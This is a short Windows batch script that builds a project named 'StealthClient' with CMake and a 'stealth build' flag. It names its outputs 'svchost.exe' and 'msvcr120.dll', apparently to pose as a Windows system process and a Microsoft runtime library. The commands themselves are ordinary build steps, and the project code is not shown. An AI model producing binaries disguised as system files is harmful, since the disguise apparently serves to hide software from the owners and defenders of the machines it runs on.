@echo off
REM Build script for Windows

echo Building StealthClient for Windows...

REM Create build directory
if not exist build_windows mkdir build_windows
cd build_windows

REM Configure with CMake
cmake .. -DCMAKE_BUILD_TYPE=Release -DENABLE_STEALTH_BUILD=ON

REM Build the project
cmake --build . --config Release

echo Build completed successfully!
echo Executable location: bin\Release\svchost.exe
echo DLL location: Release\msvcr120.dll

echo Windows build finished.
pause